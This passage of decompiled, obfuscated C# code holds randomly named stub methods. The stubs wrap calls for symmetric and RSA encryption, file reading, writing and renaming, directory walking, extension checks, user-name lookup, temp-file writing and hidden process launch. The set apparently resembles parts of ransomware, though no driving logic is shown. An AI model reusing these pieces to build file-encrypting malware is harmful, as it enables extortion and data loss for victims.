	[MethodImpl(MethodImplOptions.NoInlining)]
	public idiqGZ53EcrB8b7dX8()
	{
		//Discarded unreachable code: IL_0002, IL_0006
		//IL_0003: Incompatible stack heights: 0 vs 1
		//IL_0007: Incompatible stack heights: 0 vs 1
		r91mPxXkK4ayrNpUH51();
		rX2Q3CX4pgb5LK363Nf(this);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool shG8l8xpL2nCscn5UP()
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		return true;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool iwfKCrhyDeRQD3RCBf()
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		return false;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void Xf6i4jnEQanb8ZuAtX(object P_0, RuntimeFieldHandle P_1)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		RuntimeHelpers.InitializeArray((Array)P_0, P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void znNmI25ImoF2dp5riw(object P_0, int P_1)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		((SymmetricAlgorithm)P_0).KeySize = P_1;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void BkmnFHwep4iHC79ypN(object P_0, int P_1)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		((SymmetricAlgorithm)P_0).BlockSize = P_1;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static int oLfVKnqQmoLY61Nm68(object P_0)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		return ((SymmetricAlgorithm)P_0).KeySize;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object Q0RxZPiboQMTiQJIuo(object P_0, int P_1)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		return ((DeriveBytes)P_0).GetBytes(P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void X53qrWtXRcLM8aVY83(object P_0, object P_1)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		((SymmetricAlgorithm)P_0).Key = (byte[])P_1;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static int AobcunD3vGhTwit4hA(object P_0)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		return ((SymmetricAlgorithm)P_0).BlockSize;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void Rf5sKte2wXrtkiSIAQ(object P_0, object P_1)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		((SymmetricAlgorithm)P_0).IV = (byte[])P_1;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void mZTfD0Hk39CrjaeiQx(object P_0, CipherMode P_1)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		((SymmetricAlgorithm)P_0).Mode = P_1;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object oyhqBd3MemW4sZjEJZ(object P_0)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		return ((SymmetricAlgorithm)P_0).CreateEncryptor();
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void vn3gXKJ9qn9YeLdTV9(object P_0, object P_1, int P_2, int P_3)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		((Stream)P_0).Write((byte[])P_1, P_2, P_3);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void Y0f9eLBpMSfRx3ctLm(object P_0)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		((Stream)P_0).Close();
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void DYY4nSLv9KIg6E68Ck(object P_0)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		((IDisposable)P_0).Dispose();
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object j9CngoPlwlVZ8YB0GN(object P_0)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		return ((MemoryStream)P_0).ToArray();
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static int Pn6UZwFcYb36S357Wo(object P_0)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		return ((string)P_0).Length;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static int rITHkG1BYLXu7rksYK(object P_0, int P_1)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		return ((Random)P_0).Next(P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static char gjx8YXA1eukHiQDAWB(object P_0, int P_1)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		return ((string)P_0)[P_1];
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object w0o1va8tGA5Ztrklwr(object P_0, char P_1)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		return ((StringBuilder)P_0).Append(P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object jMdFZ5T4T7atNZDKAY(object P_0)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		return File.ReadAllBytes((string)P_0);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object VNGd1mlDXQ45RZXOJV()
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		return Encoding.UTF8;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object uIPgC8bCjZRsE4g4OZ(object P_0, object P_1)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		return ((Encoding)P_0).GetBytes((string)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object tUb8adfwUI4dPaJIxR()
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		return SHA256.Create();
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object fPXMmQdo3yM7w1j31s(object P_0, object P_1)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		return ((HashAlgorithm)P_0).ComputeHash((byte[])P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object nGIotqmT4pwD9RT3mC(object P_0, object P_1)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		return AnoO6LjqT(P_0, P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void ka2P01Z9776UJ0GZDD(object P_0, object P_1)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		File.WriteAllBytes((string)P_0, (byte[])P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object z1XsLsUnROdUNLbDg8(object P_0, object P_1)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		return (string?)P_0 + (string?)P_1;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void PbrdtUuJwskHJArdGH(object P_0, object P_1)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		File.Move((string)P_0, (string)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object iWBpFUoTnUwM5QlRI5(object P_0)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		return Directory.GetFiles((string)P_0);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object eSg0nly69ucRPl2hnY(object P_0)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		return Directory.GetDirectories((string)P_0);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object R8TxUP0e4yjSFUp4gW(object P_0)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		return Path.GetExtension((string?)P_0);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool n1bbvHCUhIF71K4Q0e(object P_0, object P_1)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		return (string?)P_0 == (string?)P_1;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void spOVV9IDoVVABCGfa4(object P_0, object P_1)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		gqRlgtY77(P_0, P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void qHD4rhvBME5ETZxXI8(object P_0, object P_1)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		MOhFQx25R(P_0, P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object al9XD59ubVO9WD4OZN()
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		return Environment.UserName;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object tef1SgNMFfDp4NoIdN(object P_0, object P_1, object P_2)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		return (string?)P_0 + (string?)P_1 + (string?)P_2;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void TiRCRLKuEsst329DuV(object P_0, object P_1)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		File.WriteAllLines((string)P_0, (string[])P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object gBEheIagaDDAlCXxMM()
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		return Path.GetTempPath();
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void mA5tuiEUHgXSYMXgnR(object P_0, object P_1)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		((AsymmetricAlgorithm)P_0).FromXmlString((string)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object zuiPSrYgqo4s6Tors9(object P_0, object P_1, bool P_2)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		return ((RSACryptoServiceProvider)P_0).Encrypt((byte[])P_1, P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object phEu9FgIeeWKgYKCYA(object P_0)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		return Convert.ToBase64String((byte[])P_0);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void SmYTdQOHBFKrHqE5uf(object P_0, bool P_1)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		((RSACryptoServiceProvider)P_0).PersistKeyInCsp = P_1;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void dHqDcIsOffYjWuEdit(object P_0, bool P_1)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		((ProcessStartInfo)P_0).UseShellExecute = P_1;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void IBCgQcWxOFUwvb6WxO(object P_0, ProcessWindowStyle P_1)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		((ProcessStartInfo)P_0).WindowStyle = P_1;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void xUd067VyKQKZvj2fx8(object P_0, object P_1)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		((ProcessStartInfo)P_0).FileName = (string)P_1;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void YwynPWctih3nWCAGtc(object P_0, object P_1)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		((Process)P_0).StartInfo = (ProcessStartInfo)P_1;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool y9cUQBzPSe9bsnbWMt(object P_0)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		return ((Process)P_0).Start();
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void cbslaxX2rAFp7FQVtsP(object P_0, bool P_1)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		((ProcessStartInfo)P_0).RedirectStandardOutput = P_1;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void E0SBY3XXsoNsR5sfZLR(object P_0, bool P_1)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		((ProcessStartInfo)P_0).CreateNoWindow = P_1;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object uOl0TmXM3MdAI03hZTr(object P_0)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		return Process.Start((ProcessStartInfo)P_0);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object uFVGZqXjTBU6WmNaKGF(object P_0)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		return ((Process)P_0).StandardOutput;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void PisWDNXS4vcV4KI2rDc(object P_0)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		((Process)P_0).WaitForExit();
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object PDLwefXrQKpac54b4We(object P_0, object P_1)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		return Process.Start((string)P_0, (string)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void r91mPxXkK4ayrNpUH51()
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		aCKNNA9Nkq52MPimBK.IJec1kPz13dhk();
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void rX2Q3CX4pgb5LK363Nf(object P_0)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		P_0._002Ector();
	}
}
